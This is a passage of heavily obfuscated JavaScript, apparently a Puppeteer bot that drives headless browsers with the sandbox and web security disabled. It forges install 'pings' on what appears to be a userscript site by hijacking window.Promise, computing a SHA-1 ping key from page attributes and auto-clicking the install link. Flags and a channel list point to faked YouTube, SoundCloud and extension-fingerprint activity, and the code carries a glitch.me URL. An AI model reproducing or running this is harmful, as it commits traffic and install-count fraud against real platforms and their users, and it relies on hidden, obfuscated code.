y[0x16d8 + 0x332 + -0x1a07 * 0x1 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1ae3 * 0x1 + -0xf6e + -0x2a91 * -0x1 ? (this['block'] = P[-0x530 * 0x7 + -0x18e8 + 0x3d48], this['start'] = N - (0x189 * -0x13 + 0x10c4 + 0xca7), this['hash'](), this['hashed'] = -0xc3f + 0xb3c * -0x1 + -0x2 * -0xbbe) : this['start'] = N;
                }
                return this['bytes'] > -0x17c7947 * -0x68 + -0x1 * 0x13c0ee3bb + 0x1545fe5 * 0x13a && (this['hBytes'] += this['bytes'] / (0x4a0326e8 * -0x4 + 0x921b1068 + 0x195f18b38) << -0x256e + 0x21f8 + 0x2 * 0x1bb, this['bytes'] = this['bytes'] % (0xfd18ea14 + -0x2844 * 0x5879a + 0xe18f2ad4)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x100b + -0x25fc + 0x98 * 0x5b;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x136a + -0x740 * -0x5 + -0x379a] = this['block'], J[K >> -0x99f * 0x1 + 0x187f + 0x76f * -0x2] |= x[0x13 * -0x8 + -0x2 * 0x80c + -0x4b * -0x39 & K], this['block'] = J[-0x1 * -0x1ab9 + 0x1 * -0x1e2b + 0x382], K >= 0x230c + -0xac3 * -0x2 + -0x385a && (this['hashed'] || this['hash'](), J[-0x293 + 0x949 * -0x1 + -0x2f7 * -0x4] = this['block'], J[0x1 * -0x1147 + -0x1 * 0x10a5 + 0x21fc] = J[0x1ebb + 0x23cb + -0x1 * 0x4285] = J[-0x685 * -0x3 + -0x85c + -0x3 * 0x3bb] = J[-0x2005 * 0x1 + 0x1f9f + 0x7 * 0xf] = J[-0x3f + 0xe9d + -0xe5a] = J[0x1 * -0xe17 + 0x26b5 + -0x1899] = J[-0x1e66 + 0x1 * -0x2197 + 0x1 * 0x4003] = J[-0x1f4 * 0x1 + 0x1be6 + 0x5 * -0x52f] = J[-0x1 * 0x2572 + -0xefa * 0x1 + 0x1a3a * 0x2] = J[0x20a + 0x11fc + 0x1 * -0x13fd] = J[-0x2460 + -0x1338 + 0x1bd1 * 0x2] = J[-0x1 * -0x6d1 + 0x78e + -0xe54] = J[0xffa + 0x23cf + -0x33bd] = J[-0x511 + -0x128c + 0x17aa] = J[-0xb4e + -0x6a * -0x20 + -0x1e4] = J[0x12a3 * -0x1 + -0xf * 0x1cb + 0x2d97] = 0x38b + 0x19b9 + -0x1d44), J[-0x2 * -0x28c + 0x3e * 0x49 + -0xb5c * 0x2] = this['hBytes'] << -0x18d1 * 0x1 + 0x1018 + 0x4 * 0x22f | this['bytes'] >>> -0x1109 * -0x1 + -0x1 * -0x266c + -0x3758, J[-0x676 + -0x354 * -0x6 + -0xb * 0x139] = this['bytes'] << -0x20e1 + -0x15 * -0x92 + 0x14ea, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x7c * 0x9 + -0x53 * -0x19 + -0xc67; J < -0x2b6 + 0x5c8 + 0x1 * -0x2c2; ++J)
                K = Q[J - (-0x1c7 + -0x3e7 + 0x1f * 0x2f)] ^ Q[J - (0x1 * 0x1f66 + 0x2235 + -0x4193)] ^ Q[J - (0x1d5c * 0x1 + 0x5d5 * -0x2 + 0x4 * -0x469)] ^ Q[J - (-0x1763 + -0xc49 + 0x23bc)], Q[J] = K << -0x21e8 + -0x3 * -0x871 + 0x896 | K >>> 0xe5a + 0x1 * 0x299 + -0x10d4;
              for (J = 0x248a + -0x1fa7 * 0x1 + -0x4e3; J < -0x1aca + 0x1 * 0x1fee + -0x510; J += -0x66 * 0xd + 0xb * 0x83 + -0x6e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1ec3 + 0x7f + 0x1e49 | L >>> 0x61c + 0x22e3 + -0x28e4) + (M & N | ~M & O) + P + (0x9700fa32 + -0x7d875877 + -0x5 * -0xd01c4c6) + Q[J] << 0x3 * -0xbdb + 0x2003 + 0x38e) << -0xfde * -0x1 + -0x507 + -0xad2 | P >>> 0x14c7 + 0x59f * -0x1 + -0xf0d) + (L & (M = M << -0x646 + 0x1 * -0x20a7 + 0x270b | M >>> -0x25e8 + 0x1 * -0x531 + 0x2b1b) | ~L & N) + O + (-0x2c91032a + -0x8ec471 * -0x45 + 0x60988a4e) + Q[J + (-0x15ce + -0x20e5 + 0x36b4)] << 0xe * -0x296 + -0xb * -0x31f + 0x1df * 0x1) << -0x4f * 0x37 + -0x470 + 0x1a * 0xd3 | O >>> 0x1dba + 0x194d + -0x26 * 0x172) + (P & (L = L << 0x432 + -0xa3b + 0x627 | L >>> 0x184 + 0x3 * -0xad8 + 0x1f06) | ~P & M) + N + (0x3724d796 + 0x1baa2 * -0x1b80 + 0x52ea0903) + Q[J + (0x412 + -0xa * -0x3c7 + -0x29d6)] << -0x15 * -0x137 + 0x448 + 0x1d * -0x107) << 0xdfb * 0x2 + 0x1717 + -0x3308 | N >>> -0x115 * 0x10 + -0x1842 + 0x1 * 0x29ad) + (O & (P = P << -0x1e7f + 0x2637 + 0x8b * -0xe | P >>> 0xd57 + 0x11d * -0xa + -0x233) | ~O & L) + M + (0xab5f3e37 + 0x21010d75 + -0x71ddd213) + Q[J + (-0x250e + 0x13d * -0x14 + 0x3dd5)] << -0x1 * 0xbcb + -0x129c * -0x1 + -0x6d1) << -0xe * 0x16b + -0x11d * 0x23 + 0x3ad6 | M >>> 0x206b + 0x20a9 + 0x40f9 * -0x1) + (N & (O = O << 0x11b * -0x9 + 0x13 * -0x3e + 0xeab | O >>> 0xad7 + 0x112e + -0x1c03) | ~N & P) + L + (0x3008 * 0x23af1 + 0x2 * 0x29efe4e6 + -0x647c57bb) + Q[J + (-0xcd6 + 0x3 * -0x556 + 0x4 * 0x737)] << -0x1 * 0x18b1 + -0x1 * -0x1f01 + -0x650, N = N << 0x2c * -0x7a + 0x1a68 + -0x552 | N >>> 0x2681 * -0x1 + -0x883 + 0x2f06;
              for (; J < 0x1 * 0x1f42 + 0x6f3 + -0xbf * 0x33; J += 0x1 * 0x877 + 0x17bd + -0x499 * 0x7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2317 * 0x1 + -0x14b7 * -0x1 + -0x1 * 0x37c9 | L >>> 0xb26 * 0x1 + -0x773 * 0x1 + -0x398) + (M ^ N ^ O) + P + (-0x59 * 0x11f051e + 0x1 * -0x5de2d683 + -0x31e6 * -0x61a53) + Q[J] << -0x2084 + -0x7f * -0x25 + -0x1d * -0x7d) << 0x22 * -0x92 + -0xf8c + 0x3 * 0xba7 | P >>> -0x2602 + 0x1 * -0x190f + -0xd * -0x4dc) + (L ^ (M = M << -0x2489 + -0x3a * -0xa8 + -0x169 | M >>> -0x23c9 + -0x6 * -0xdd + -0x11 * -0x1cd) ^ N) + O + (0x7567ebe * -0x8 + 0xbc30ccf7 + -0x12a2eb66) + Q[J + (0xb4b + 0xd * 0x2f5 + -0x1 * 0x31bb)] << 0x1bb4 + -0xcce + -0xee6) << 0x1e01 + -0xd4 * -0x13 + -0x2db8 | O >>> 0x19f2 + 0x569 + -0xfa * 0x20) + (P ^ (L = L << -0x1 * -0x2695 + 0x4 * -0x8b5 + 0x1 * -0x3a3 | L >>> 0x1290 + 0x1e9 * 0x5 + -0x1c1b) ^ M) + N + (-0x1472 * -0x3acbd + 0xb25c9daa + 0x8ea46233 * -0x1) + Q[J + (0xfbf + 0x1 * 0x18bb + -0x2878)] << 0xaa9 + 0x2639 * 0x1 + -0x30e2) << 0x1f4c + -0x2 * -0x8ee + -0x3123 | N >>> 0x1934 + 0x1cf8 + -0x3611) + (O ^ (P = P << 0x3 * 0x5d6 + -0x1804 + -0x4 * -0x1a8 | P >>> 0x1ee0 + 0x1d43 + 0x140b * -0x3) ^ L) + M + (0xd4ed37b2 * -0x1 + -0x2e3651a8 + 0x171fd74fb) + Q[J + (-0x17 * -0x71 + -0xdf * -0x21 + 0x5 * -0x7c7)] << 0x1c3b + 0x1 * -0x11e + -0xb * 0x277) << 0xb25 * 0x1 + 0x1e2e + 0x137 * -0x22 | M >>> -0x2079 * 0x1 + 0x2d3 + 0x1dc1) + (N ^ (O = O << 0x4 * 0x5c6 + 0x20f + 0x179 * -0x11 | O >>> -0x2252 + -0x7 * -0x6f + 0x1 * 0x1f4b) ^ P) + L + (-0x2 * 0x2f730b71 + 0x45ebb33e + 0x2bbd1f * 0x31b) + Q[J + (0xa * -0x397 + -0x62b + -0x3f * -0xab)] << 0x11e4 + -0x427 + -0xdbd, N = N << -0x1 * 0x2302 + 0x1 * -0x1b81 + 0x3ea1 * 0x1 | N >>> 0xae7 + -0x1b02 + -0x3 * -0x55f;
              for (; J < 0x1ea9 + -0x3 * 0x8d5 + 0x1f7 * -0x2; J += -0x5ee + 0x159b + 0x6 * -0x29c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2695 + 0x7a * 0x17 + 0x1ba4 | L >>> -0x1d35 + -0x2 * 0xf3e + 0xef3 * 0x4) + (M & N | M & O | N & O) + P - (-0xddd8322a + -0x5cd51f87 + 0x1ab9194d5) + Q[J] << 0x17cd + 0x1f60 * -0x1 + 0x793) << -0x3 * -0x7e1 + 0x151 * 0x5 + -0x1e33 | P >>> -0x619 * -0x3 + 0xc01 + -0x1e31) + (L & (M = M << -0x139f + -0x1f16 * -0x1 + -0x245 * 0x5 | M >>> 0x1 * 0xf37 + -0x2c7 + -0x1 * 0xc6e) | L & N | M & N) + O - (-0x3ede23f0 + 0x28403b60 + -0x21e08aed * -0x4) + Q[J + (-0x6e * -0x53 + 0x2616 + -0x383 * 0x15)] << 0x25ba + 0x7d0 + -0x2d8a) << -0x74f + 0x118d * 0x1 + 0x1 * -0xa39 | O >>> 0x1a0d + 0x9 * -0x201 + 0x1b * -0x4b) + (P & (L = L << -0x4 * -0x220 + 0x50e + -0x158 * 0xa | L >>> 0x1299 + -0x620 + -0xc77) | P & M | L & M) + N - (0x3a75f4cf * 0x3 + -0x1 * 0xb0d6ab3b + 0x72590ff2) + Q[J + (-0xe * -0xb2 + 0x53e + 0x4 * -0x3be)] << 0x1803 + -0x13df * -0x1 + -0x2be2) << 0xf5a + 0x238 * 0x7 + -0x1edd | N >>> -0x24dd * -0x1 + -0x14e8 + -0xfda) + (O & (P = P << -0x9fc + -0x1de6 + 0x2800 | P >>> 0x1ea7 + -0x7 * -0x2c + 0x1fd9 * -0x1) | O & L | P & L) + M - (0x67c2f6f7 + -0xda4cb * 0x225 + -0x2d4 * -0xd92fd) + Q[J + (0x16 * -0x1be + -0xc04 * -0x1 + 0x1a53 * 0x1)] << -0xcc0 + 0x1 * -0x442 + 0x1102) << -0x136a + -0x158d + 0xac * 0x3d | M >>> -0xd * 0x191 + -0x1 * -0x2158 + -0x20 * 0x67) + (N & (O = O << -0x20db + -0x18 * 0x197 + 0x4721 | O >>> 0x3 * 0x45f + -0xbbb + -0x1 * 0x160) | N & P | O & P) + L - (0x2 * 0x19ba793f + 0x2e237 * 0x32b6 + -0x54cc4074) + Q[J + (0x1a03 * -0x1 + -0x191e + 0x3325 * 0x1)] << -0x155e + -0x1180 + 0x26de, N = N << 0xbc6 * -0x1 + -0x11f9 + 0x1ddd | N >>> 0xa2f + 0x24ce + 0x279 * -0x13;
              for (; J < 0x1f89 + -0x5bf * -0x2 + -0x2ab7; J += 0x13eb + 0x24f2 * -0x1 + 0x886 * 0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x27 * -0xa7 + 0x61f + -0x1357 * -0x1 | L >>> 0x431 + -0x1ee3 + 0x1acd) + (M ^ N ^ O) + P - (0x1 * 0x73a5cf9 + -0x4de66ef8 + -0x1 * -0x7c495029) + Q[J] << 0x6c4 + 0x1 * 0xa85 + 0x5 * -0x375) << 0x1c2f + 0x257f + -0x41a9 | P >>> 0x598 + -0x1813 * 0x1 + -0x632 * -0x3) + (L ^ (M = M << -0x3a1 * 0x5 + -0x121a + 0x245d | M >>> 0x4b3 * 0x2 + 0x1e98 + -0x27fc) ^ N) + O - (-0x980b56e + -0x2 * -0x11ef12a9 + -0x1b3fce46 * -0x1) + Q[J + (-0x1853 + -0x11 * -0xdd + 0x9a7)] << 0x1 * 0x12b + 0x1030 + -0x1 * 0x115b) << -0x40 * 0x42 + -0xe3 * -0x3 + 0x377 * 0x4 | O >>> -0x89a + -0x8ae + -0x1 * -0x1163) + (P ^ (L = L << -0x588 * -0x5 + -0x1 * 0xec + 0x1a9e * -0x1 | L >>> -0x1eda + 0x1 * 0x1e9 + -0x1cf3 * -0x1) ^ M) + N - (-0x20cb849 * -0x30 + 0xf8fa9 * -0x675 + 0x37b54eb7 * 0x1) + Q[J + (-0x1 * -0x9b + 0x25a + -0x2f3)] << -0x1dde + -0x2b * -0x67 + 0xc91) << -0x2128 + -0x8b * -0x3d + 0x1 * 0xe | N >>> 0x177d * 0x1 + -0x4 * 0x392 + -0x91a) + (O ^ (P = P << 0x16 * 0x17c + -0x6b + 0xab5 * -0x3 | P >>> -0x9e6 + -0x7 * 0x3b1 + -0x1 * -0x23bf) ^ L) + M - (-0x653f969f + -0x5 * 0xd4b82da + -0xdd56630b * -0x1) + Q[J + (-0x14d4 + -0x15d * 0x17 + 0x3432)] << -0x1 * 0x52e + -0x7c6 + 0x33d * 0x4) << -0x1 * -0x34 + -0x1 * 0x143b + 0x140c | M >>> 0xac5 + 0x10 * -0x29 + 0x22 * -0x3d) + (N ^ (O = O << 0x2384 + 0x383 + -0x58f * 0x7 | O >>> 0x707 + -0xfd6 + -0x1 * -0x8d1) ^ P) + L - (0xad * 0x4e85ab + -0x51adaeb1 + 0x523a984c) + Q[J + (0x1f6a + 0x5 * -0x69a + -0x67 * -0x4)] << -0xb21 + -0x1 * 0xd3b + 0x2 * 0xc2e, N = N << -0xdb9 + 0x2 * 0xb75 + 0x17 * -0x65 | N >>> 0x423 * -0x1 + 0x15 * -0x11f + 0x376 * 0x8;
              this['h0'] = this['h0'] + L << 0xe5 + -0x1a24 + -0x193f * -0x1, this['h1'] = this['h1'] + M << 0x13e5 * 0x1 + -0x8a9 + -0xb3c, this['h2'] = this['h2'] + N << 0x1 * 0x471 + -0x3d9 * 0x1 + -0x98, this['h3'] = this['h3'] + O << -0x3 * -0x26 + 0x492 + -0x1 * 0x504, this['h4'] = this['h4'] + P << -0xed0 + -0x1fbe + 0x2e8e;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x4d * -0x4 + 0x2375 + 0x2225 * -0x1 & 0x6ad * 0x1 + -0x259b + 0x1efd * 0x1] + w[J >> -0xffd * -0x1 + -0xb06 + 0x4df * -0x1 & 0xc3d + 0x1 * 0x48d + -0x10bb] + w[J >> 0x1eba + -0x1bf + -0x1ce7 & 0x11f8 + 0x1 * -0x287 + -0xf62 * 0x1] + w[J >> -0xa * -0x23f + 0x1 * -0x22a8 + -0xc42 * -0x1 & -0x6e3 * -0x2 + -0x16 * 0xec + 0x691 * 0x1] + w[J >> -0x19b1 * 0x1 + 0x1e2 * 0x1 + 0x17db & 0x409 * 0x2 + 0x742 + -0x1 * 0xf45] + w[J >> -0x4d * 0x59 + 0x13d * -0x19 + 0x39c2 & 0x1 * -0x127 + 0x28 * -0x61 + 0x105e] + w[J >> 0x1 * -0x1229 + -0x43 * 0xd + 0x1594 & -0x5 * 0x2cb + -0x18d * 0x5 + 0x15c7] + w[0xed * 0x7 + -0xce7 + -0x4f * -0x15 & J] + w[K >> -0x17b7 * 0x1 + 0x25a0 + -0xdcd & 0x2 * 0xc66 + 0x13bb * 0x1 + -0x58f * 0x8] + w[K >> 0x4e * -0x24 + -0x18 * -0x7c + 0x2 * -0x48 & 0x5ef + 0x127d + -0x185d] + w[K >> 0x9b9 + -0xe7c + 0x19d * 0x3 & 0x26 * 0xf4 + -0x1a5 * -0xb + -0x3640] + w[K >> -0x3 * 0x711 + -0xdf * -0x7 + -0x795 * -0x2 & -0xf0c + 0x156a + 0x11 * -0x5f] + w[K >> -0x2005 * -0x1 + -0xb6 * -0x33 + 0x1 * -0x443b & -0x16ab + 0xf * -0xd3 + 0x2b3 * 0xd] + w[K >> -0x1 * 0x16f6 + 0x175 + -0x95 * -0x25 & -0x121a + 0x6d9 + 0xb50] + w[K >> 0x1357 + 0x1de4 + -0x3137 & 0x14b1 + 0xa27 + -0xa43 * 0x3] + w[0x7ea + 0x6fb + -0x2 * 0x76b & K] + w[L >> 0x1c58 + -0xde4 * 0x1 + -0xe58 & 0x1235 + 0x60 * 0x40 + 0x53 * -0x82] + w[L >> 0x37 * -0x16 + -0x32d + -0x59 * -0x17 & -0x2612 + 0x7 * 0x476 + -0x24d * -0x3] + w[L >> -0x1 * -0xa07 + 0x179f + -0x2192 & 0x90f + -0x138a + -0x47 * -0x26] + w[L >> 0x7 * -0x33d + -0x67 + 0x1 * 0x1722 & -0x1 * 0x1511 + 0x1 * 0x35f + 0x11c1] + w[L >> 0x574 + 0x1a90 + -0x554 * 0x6 & 0xbf * -0x6 + -0x35f * -0x1 + -0x95 * -0x2] + w[L >> 0x13d0 + 0x1734 + 0x54 * -0x83 & -0xa2c + -0x1 * -0xf86 + -0x54b] + w[L >> -0x1781 + 0x140e + 0x1 * 0x377 & -0x4d * 0x1 + 0xf3 + -0x97] + w[-0x1697 * -0x1 + 0x147 + -0x17cf & L] + w[M >> 0x456 + 0x1 * -0x1b3e + 0x1704 & 0xf44 * -0x2 + -0x1 * -0x1ba5 + 0x2f2] + w[M >> -0x2457 + -0x4 * -0x86f + -0x2b3 * -0x1 & 0x1 * 0x1421 + 0x1a7 + -0x15b9] + w[M >> 0x225a + -0x1462 + -0xde4 & 0xad * 0x3 + -0x9 * -0x1e5 + 0x3 * -0x657] + w[M >> -0x16cc + -0x7 * 0x89 + -0x8b * -0x31 & -0x1 * -0x2a7 + -0x112a + 0x2 * 0x749] + w[M >> -0x20f2 + 0xe17 * -0x1 + 0x2f15 & 0x76a + -0xdea + 0x68f] + w[M >> -0x2209 + -0x7b5 * -0x3 + -0xaf2 * -0x1 & -0xc7a + 0x1 * -0x1f35 + -0xb * -0x3fa] + w[M >> -0x1 * 0x1df2 + -0x25 * -0xa6 + -0x2 * -0x2fc & -0x8c6 + 0x1 * -0x13eb + 0x1cc0] + w[-0xa8c + 0x80f * -0x1 + 0x12aa * 0x1 & M] + w[N >> -0xcd8 * 0x3 + -0x21 * 0xa4 + -0x779 * -0x8 & -0x7 * -0x139 + 0x17f3 + -0x2073] + w[N >> 0x1e92 + -0x6c8 + 0x6 * -0x3f3 & -0x879 * 0x3 + 0x1f9e + -0x6 * 0x106] + w[N >> -0x253 + -0x1a17 + 0x1c7e & -0x22d8 + -0x6 * -0x493 + 0x17 * 0x53] + w[N >> 0x18b3 + -0x16d6 + -0x1cd & 0x2203 + -0xc71 + -0x1583] + w[N >> 0x2149 * -0x1 + 0x9fe + -0x19 * -0xef & 0x222d + 0x1 * -0x147d + -0x3 * 0x48b] + w[N >> -0x7ab + -0x20de + 0x2891 & -0x2 * 0xd31 + 0x50c * -0x5 + -0x1 * -0x33ad] + w[N >> -0x1 * 0x1656 + -0x1dac + 0x3406 & 0x115e + -0x6f1 + -0xa5e] + w[0x2144 + -0x23a3 + -0x26e * -0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x23b2 + 0x207e + 0x34c & 0x251 * 0xe + 0x2 * -0x129 + -0x1d1d,
                J >> -0x4 * 0x830 + 0xd0 * 0x2b + -0x10 * 0x22 & -0x53 * -0x45 + 0xaca * 0x1 + 0x166 * -0x17,
                J >> 0x26a4 + -0x1 * 0x91b + -0x1d81 & 0x1472 + -0x11c2 + 0x1b1 * -0x1,
                -0x20e8 + 0x1 * 0xc74 + 0x11 * 0x143 & J,
                K >> 0x11 * 0x16a + -0x327 * -0x1 + -0x1b19 & -0xe26 * -0x1 + 0x54c + -0x1273,
                K >> -0x70a + -0x17f3 * 0x1 + -0x1f0d * -0x1 & -0x9ca + 0x20c9 + -0x1600,
                K >> 0x2fb * -0xd + -0xa4 * -0x9 + -0x2103 * -0x1 & 0x2518 + 0x2321 * 0x1 + -0x1 * 0x473a,
                -0x1 * -0x21f + -0x1913 * 0x1 + 0x1 * 0x17f3 & K,
                L >> -0x234d + -0x94 * 0xb + 0x29c1 & 0xe27 * 0x1 + -0x1 * 0x1df3 + 0x10cb * 0x1,
                L >> 0x719 * 0x4 + -0x8 * 0x305 + 0x10b * -0x4 & 0xbf * -0x1 + -0x2613 + 0x27d1,
                L >> -0x26a9 + 0x332 * -0x5 + 0x9 * 0x613 & -0x4d0 + -0x869 + 0x2 * 0x71c,
                0xc7 + 0x1f51 * -0x1 + -0x3 * -0xa83 & L,
                M >> -0x5 * -0x6bb + -0x11e6 + 0xd3 * -0x13 & -0x3 * 0x481 + 0xf * -0x239 + 0x3 * 0xff3,
                M >> 0x1da5 + -0x1dc6 + -0x1 * -0x31 & -0x112b + -0x1 * -0x209 + 0x1021,
                M >> 0xb * -0x20b + -0x130c + 0x1 * 0x298d & -0x20e3 * 0x1 + 0xbf1 + 0x1 * 0x15f1,
                0x1 * -0x1085 + -0x1fc * -0x3 + -0x28 * -0x4a & M,
                N >> -0xfc4 + -0x167e + 0x1 * 0x265a & -0x13 * -0xdf + 0x1 * 0x26fc + -0x368a,
                N >> 0x1185 + -0x1604 + 0x3 * 0x185 & 0x1 * -0x13f7 + -0x1 * -0x195b + 0x4b * -0xf,
                N >> -0x116e + -0x23c3 + 0x3539 & 0x12a6 + 0x1eb6 * -0x1 + 0x1 * 0xd0f,
                -0x142 * -0x1b + 0x421 * 0x6 + -0x39bd & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1545 + -0x86b * -0x1 + -0x677 * -0x2), (K = new DataView(J))['setUint32'](-0x2232 + -0x265e + 0x4890, this['h0']), K['setUint32'](0x856 + -0x84 * 0x11 + -0x72 * -0x1, this['h1']), K['setUint32'](0x2642 + 0x1ee6 + 0x229 * -0x20, this['h2']), K['setUint32'](-0x19b1 * -0x1 + -0x1741 + 0x22 * -0x12, this['h3']), K['setUint32'](0x21fd + -0x2251 + 0x32 * 0x2, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1 * -0x13eb + -0x2624 + 0x3a0f];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1 * -0x2299 + -0x18d7 + -0x9c2;
            J[-0x1cd4 + -0x1 * -0x1d1b + -0x47 * 0x1]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x221a + 0x1eb0 + 0x36a] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x4 * 0x17 + 0x1e0e + -0x3 * 0xa23), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x21de + 0x1d05 + -0x3ee2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1d51 + -0x1b2 * 0x1 + 0x24df * 0x1), Promise['resolve'](-0x1 * -0x60a + 0x90e + -0xf17 * 0x1);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x12df + -0xb6d + -0x22a * -0xe; j < 0x1762 * -0x1 + 0x6a3 + 0x10c0; j++)
    i();
}
const NETWORK_PATIENCE = -0x187c + -0x1 * 0x2eb1 + 0xd * 0x7e1 + (0x1645 * 0x1 + 0x265d + -0x827 * 0x6) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x4a9 + 0xdb * -0xa + -0xa * -0x64) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + W(0x14),
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x11c6 + -0x21a * -0x10 + -0xfda; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function a() {
  const bk = [
    'ndGWna',
    'zg9JDw1LBNq',
    'W6pdMGTelSoNWPyOWRea',
    'W5yrWRW2WQZdQNOIt8oP',
    'W4JdPrG',
    'E9%A2%98%E',
    'qCk+imkFWRVcPSogWQtdLG',
    'kY7cStZcP1ldU8kuW73dSq',
    'WP0MW5hcLKVcJWVcM8ozW5i',
    's2L0lZuZnY4ZnG',
    'lmkbW6JcQSobW7z8dLym',
    'W5FdTG7cPmo5W6FcJmodW7eX',
    'children',
    '.com',
    'yxnZAwDU',
    'WRldGaXbyCkLWPaXWRK',
    'fCkjW7zDWOO8W7nfWQVcPW',
    '\x20beast\x20hin',
    'W7FdMSkAxmoO',
    'CMjLyxn0igHPBG',
    'caX8',
    'dium.com/@',
    'd,sad\x20bts,',
    'nKLTwMr3Cgr3va',
    'WRGNlmokW5pdTrCllJC',
    'WPRcSSowWR7cPmk2wxPnWRO',
    '2b2a05a',
    'rg/en/scri',
    'createHash',
    '8X2fF4pgM0',
    'W5bqzmoUW5PdtSopASon',
    'e/*',
    'ywKTD2f2zs1PAq'
  ];
  a = function() {
    return bk;
  };
  return a();
}
